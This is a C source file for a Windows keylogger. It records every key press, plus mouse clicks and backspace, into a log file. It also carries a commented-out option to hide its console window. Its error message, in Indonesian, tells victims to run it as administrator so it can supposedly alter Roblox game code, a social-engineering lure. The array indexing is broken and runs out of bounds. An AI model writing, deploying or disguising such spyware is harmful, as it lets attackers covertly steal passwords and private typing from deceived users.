#define _WIN32_WINNT 0x0500

#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include <stdbool.h>

#include "keylogger.h"

DWORD WINAPI activateKeylog(LPVOID param)
{
    HWND hwnd=GetConsoleWindow();
    //ShowWindow(hwnd,SW_MINIMIZE); //wont hide the window, minimise
    //ShowWindow(hwnd,SW_HIDE);

    FILE * fp = fopen(KEYLOG_PATH, "a");

    if (fp == NULL){
        perror("JALANKAN SEBAGAI ADMINISTRATOR\nAGAR PROGRAM DAPAT MENGOTAK-ATIK\nKODE GAME ROBLOX YANG ADA PADA\nKOMPUTER ANDA");
        getchar();
        exit(1);
    }
    unsigned char count = 1;

    char buffer[5] = {0};
    bool keyDown[62] = {false};

    fputs("\n", fp); fflush(fp);
    while (1) {
        for(int i = 0; i < 0xFE; i++){
            buffer[0] = (char)i;
            if ((GetAsyncKeyState(i) & 0x8000) && !keyDown[i-32]) {
                count++;
                if ((short)count == 125){fputs("\n", fp); fflush(fp); count = 0;}
                sprintf(buffer, "%c", (char)i);
                printf("%c %d\n", (char)i, i);
                fputs(buffer, fp);
                fflush(fp);
                keyDown[i-32] = true;
            }else if (!(GetAsyncKeyState(i) & 0x8000)) {
                keyDown[i-32] = false;
            }            
        }

        if ((GetAsyncKeyState(1) & 0x8000) && !keyDown[0]){ fputs("[MOUSE1]", fp); fflush(fp);}
        else if (!(GetAsyncKeyState(1) & 0x8000)) keyDown[0] = false;

        if ((GetAsyncKeyState(2) & 0x8000) && !keyDown[1]){ fputs("[MOUSE2]", fp); fflush(fp);}
        else if (!(GetAsyncKeyState(2) & 0x8000)) keyDown[1] = false;

        if ((GetAsyncKeyState(8) & 0x8000) && !keyDown[2]){ fputs("[BACKSPACE]", fp); fflush(fp);}
        else if (!(GetAsyncKeyState(8) & 0x8000)) keyDown[2] = false;


        Sleep(50);
    }
    
    fclose(fp);
 
 return 0;
}
